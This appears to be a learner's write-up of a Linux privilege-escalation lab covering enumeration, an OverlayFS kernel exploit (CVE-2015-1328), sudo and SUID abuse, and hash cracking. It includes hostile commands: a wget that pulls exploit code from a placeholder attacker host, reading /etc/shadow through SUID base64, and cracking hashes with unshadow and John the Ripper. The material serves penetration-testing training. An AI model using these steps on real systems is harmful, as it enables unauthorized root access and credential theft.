# Linux Privilege Escalation
**Date:** July 15, 2026

## Overview

Privilege Escalation is the process of gaining higher privileges on a system after obtaining initial access. In most real-world penetration tests, the first compromise does not provide administrative (root) access. Instead, an attacker typically gains access as a low-privileged user and must identify vulnerabilities, misconfigurations, or insecure permissions to elevate their privileges.

This room introduces the fundamentals of Linux Privilege Escalation, explains why enumeration is the most important step after gaining access, and covers the Linux commands commonly used to identify potential privilege escalation vectors.

---

# Objective

The objective of this section is to understand:

- What Linux Privilege Escalation is.
- Why privilege escalation is important during penetration testing.
- The importance of post-exploitation enumeration.
- Common Linux commands used to gather system information.
- How enumeration helps identify privilege escalation opportunities.

---

# What is Privilege Escalation?

Privilege Escalation is the process of obtaining permissions beyond those originally assigned to a user account.

In Linux environments, this typically means escalating from a standard user account to the **root** account, which has unrestricted control over the operating system.

Privilege escalation is usually achieved by exploiting:

- Vulnerabilities in the operating system
- Misconfigured file or directory permissions
- Weak sudo configurations
- Vulnerable services
- SUID binaries
- Kernel vulnerabilities
- Insecure system configurations

---

# Why is Privilege Escalation Important?

Successfully gaining access to a target system is only the beginning of a penetration test. Most initial access provides limited permissions, preventing access to sensitive files or administrative functions.

Privilege escalation allows a penetration tester to obtain elevated permissions and fully assess the security of the target environment.

With elevated privileges, it becomes possible to:

- Reset user passwords
- Bypass file and directory permissions
- Access confidential or restricted data
- Modify system configurations
- Install persistence mechanisms
- Create or modify privileged user accounts
- Execute administrative commands
- Gain complete control over the target system

---

# Understanding Network Interfaces

During enumeration, identifying available network interfaces provides insight into how the system communicates with internal and external networks.

| Interface | Meaning | Purpose |
|-----------|---------|---------|
| **eth0** | Ethernet Interface | Primary wired or virtual network connection used for communication. |
| **lo** | Loopback Interface | Virtual interface used for communication with the local machine through `127.0.0.1` (localhost). |
| **tun0** | Tunnel Interface | Virtual interface created by VPN or tunneling software to route encrypted traffic. |
| **tun1** | Second Tunnel Interface | Additional VPN or tunnel interface when multiple tunnels are active. |

Understanding available interfaces helps identify:

- VPN connections
- Internal network segments
- Pivoting opportunities
- Additional reachable networks

---

# Enumeration

Enumeration is one of the most critical phases of privilege escalation.

After gaining access to a system, the next objective is to gather as much information as possible before attempting exploitation. Proper enumeration often reveals configuration mistakes or vulnerabilities that can be leveraged to obtain higher privileges.

Enumeration should focus on identifying:

- Operating system details
- Kernel version
- Installed software
- Running services
- User accounts
- Group memberships
- Environment variables
- Network interfaces
- Open ports
- Routing information
- Scheduled tasks
- File permissions
- SUID binaries
- Writable directories
- Sensitive configuration files

The more information collected, the greater the likelihood of identifying a successful privilege escalation path.

---

# Why Enumeration Matters

Unlike Capture The Flag (CTF) challenges, real-world penetration tests do not end after gaining access to a system.

Enumeration is an ongoing process that continues throughout the engagement. Every piece of information collected may reveal a new attack path or privilege escalation opportunity.

Experienced penetration testers spend a significant amount of time performing careful enumeration before attempting exploitation.

---

# Linux Privilege Escalation – Kernel Exploits, Sudo & SUID

## Overview

This section focuses on practical Linux privilege escalation techniques after completing system enumeration. It demonstrates how to identify kernel vulnerabilities, leverage automated enumeration tools, abuse misconfigured **sudo** permissions, and exploit **SUID binaries** to gain elevated privileges.

Rather than immediately attempting exploitation, the room emphasizes collecting system information first and using that information to identify the most appropriate privilege escalation path.

---

# Task 3 – Kernel Vulnerability Enumeration

## Objective

Identify the Linux kernel version running on the target machine and determine whether any publicly known vulnerabilities can be used for privilege escalation.

---

## Identifying the Kernel Version

The first step is identifying the exact kernel version.

```bash
uname -r
```

Example Output

```text
3.13.0-24-generic
```

This indicates that the target machine is running:

- Ubuntu 14.04 LTS
- Linux Kernel 3.13.0-24-generic

Knowing both the operating system version and kernel version is essential because many privilege escalation exploits are kernel-specific.

---

## Searching for Kernel Vulnerabilities

Once the kernel version is known, the next step is searching public vulnerability databases.

Useful resources include:

- ExploitDB
- Searchsploit
- NVD (National Vulnerability Database)
- CVE.org
- Rapid7

These databases contain publicly disclosed vulnerabilities along with exploit code and affected kernel versions.

After comparing the kernel version with available exploits, the system was identified as vulnerable to:

```
CVE-2015-1328
```

This vulnerability affects Ubuntu kernels prior to version 3.19 and allows local privilege escalation through OverlayFS.

---

## What I Learned

- Always identify the exact kernel version before searching for exploits.
- Kernel exploits are highly version-dependent.
- Public vulnerability databases are valuable resources during privilege escalation.
- Matching the operating system version with the kernel version is necessary before attempting exploitation.

---

# Task 4 – Automated Enumeration Tools

## Overview

Manual enumeration is essential, but several tools can automate the information-gathering process and identify common privilege escalation vectors.

Common Linux enumeration tools include:

- LinPEAS
- LinEnum
- Linux Exploit Suggester (LES)
- Linux Smart Enumeration (LSE)
- Linux Priv Checker

These tools help identify:

- Misconfigured permissions
- Writable directories
- SUID binaries
- Weak sudo configurations
- Kernel vulnerabilities
- Sensitive files
- Installed software
- Interesting services

Although these tools save time, they should complement manual enumeration rather than replace it.

---

# Task 5 – Privilege Escalation Using Kernel Exploits

## Objective

Exploit a vulnerable Linux kernel to obtain root privileges.

---

## Enumerating the Target

Using commands such as:

```bash
uname -r
cat /proc/version
cat /etc/os-release
```

I confirmed that the target was running:

- Ubuntu 14.04 LTS
- Kernel 3.13.0-24-generic

The system also had the GCC compiler installed, allowing C source code to be compiled locally.

---

## Finding an Exploit

Using ExploitDB and Searchsploit, I searched for exploits targeting the identified kernel version.

```bash
searchsploit overlayfs
```

The results showed an OverlayFS privilege escalation exploit associated with:

```
CVE-2015-1328
```

---

## Transferring the Exploit

After downloading the exploit on my local machine, I started a temporary HTTP server.

```bash
python -m http.server 8000
```

On the target machine, I attempted to download the exploit using:

```bash
wget http://<attacker-ip>:8000/37292.c
```

Initially the download failed because I was located inside the root (`/`) directory, where the current user did not have write permissions.

After changing to the writable `/tmp` directory:

```bash
cd /tmp
```

the exploit downloaded successfully.

---

## Compiling the Exploit

Since GCC was available on the target system, I compiled the exploit.

```bash
gcc 37292.c -o exploit
```

---

## Executing the Exploit

Running the compiled binary successfully escalated privileges to the root user.

This demonstrates how outdated Linux kernels can become severe privilege escalation vectors when known vulnerabilities remain unpatched.

---

## What I Learned

- Kernel exploits require an exact kernel version match.
- Enumeration determines whether kernel exploitation is possible.
- Writable directories such as `/tmp` are useful when transferring exploit files.
- A local compiler such as GCC simplifies exploitation.
- Always verify exploit compatibility before execution.

---

# Task 6 – Privilege Escalation Using Sudo

## Objective

Identify commands that the current user can execute with elevated privileges.

---

## Enumerating Sudo Permissions

```bash
sudo -l
```

This command displays every command the current user is permitted to execute using sudo.

In this room, the user **karen** was allowed to execute:

- find
- less
- nano

---

## Why This Matters

Many Linux commands can be abused when executed with elevated privileges.

Rather than searching for kernel vulnerabilities, attackers often first inspect sudo permissions because a single misconfigured command can immediately provide root access.

---

## Locating Sensitive Files

Since `find` could be executed using sudo, it was used to locate protected files.

Example:

```bash
sudo find / -name flag2.txt
```

Once located, the file could be accessed with elevated privileges.

---

## Reading Protected Files

Because `less` and `nano` also ran with sudo privileges, they could be used to open restricted files such as:

```text
/etc/shadow
```

This allowed access to password hashes that would normally be unreadable by regular users.

---

## Important Concept

Always compare the output of:

```bash
sudo -l
```

against **GTFOBins**.

GTFOBins documents hundreds of Linux binaries that can be abused for:

- Privilege Escalation
- File Read
- File Write
- Shell Escape
- Command Execution

---

## What I Learned

- `sudo -l` should always be one of the first commands executed after gaining access.
- Misconfigured sudo permissions are among the most common privilege escalation vectors.
- Many standard Linux utilities become dangerous when executed with sudo privileges.
- GTFOBins is an invaluable reference when analyzing privileged binaries.

---

# Task 7 – Privilege Escalation Using SUID

## Objective

Identify SUID binaries and determine whether any can be abused to obtain elevated privileges.

---

## What is SUID?

SUID (Set User ID) is a special Linux permission that causes a program to execute with the permissions of its owner instead of the user running it.

If a root-owned binary has the SUID bit enabled, every user executes that binary with root privileges.

---

## Enumerating SUID Binaries

The following command searches the system for SUID files.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

This lists every executable running with elevated privileges.

---

## Analyzing SUID Programs

After identifying available SUID binaries, compare each one with GTFOBins to determine whether it can be abused.

During this room, one interesting binary was:

```
base64
```

Although base64 is normally used for encoding and decoding data, GTFOBins documents methods for abusing its SUID permissions to read protected files.

---

## Reading Restricted Files

Using the SUID-enabled base64 binary, protected files such as:

```text
/etc/passwd
```

and

```text
/etc/shadow
```

could be read even without root privileges.

Example:

```bash
base64 /etc/passwd | base64 --decode
```

---

## Recovering Password Hashes

The password hashes extracted from `/etc/shadow` were combined with the user information from `/etc/passwd`.

After transferring both files to my local machine, I used:

```bash
unshadow passwd shadow > hashes.txt
```

to combine them.

Finally, I used John the Ripper to crack the password hashes.

```bash
john hashes.txt
```

This successfully recovered the password for one of the users.

---

## Accessing Protected Files

Since the SUID-enabled binary allowed restricted files to be read, protected flag files could also be accessed without requiring root privileges.

---



